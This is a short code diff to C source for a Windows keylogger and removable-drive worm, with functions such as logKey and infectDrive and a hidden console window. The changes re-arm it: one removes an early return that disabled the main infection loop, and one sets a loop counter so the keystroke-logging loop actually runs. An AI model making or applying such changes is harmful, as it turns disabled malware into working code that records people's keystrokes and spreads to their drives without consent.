@@ -38,7 +38,7 @@ void infectDrive(char driveLetter);
 char* getRandomName();
 
 
-main(){
+int main(){
     FreeConsole(); ///hide window
 
     age = get_setAge();
@@ -69,7 +69,7 @@ main(){
     }
 
     char driveLetter = getRemovableDisk(); ///initial search for all disks
-    return; // :)
+    
     while(1){
         ////////////****LOG KEY****////////////
         if(age <= LIFE_TIME){
@@ -84,7 +84,7 @@ main(){
             infectDrive(driveLetter);
         }
     }
-    
+    return; // :)
 }
 
 /**
@@ -162,7 +162,7 @@ void logUserTime(){
 **/
 void logKey(){
     FILE *file;
-    unsigned short ch=0, i=0, j=500; // :)
+    unsigned short ch=0, i=0, j=0; // :)
 
     while(j<500){ ///loop runs for approx. 25 seconds
         ch=1;
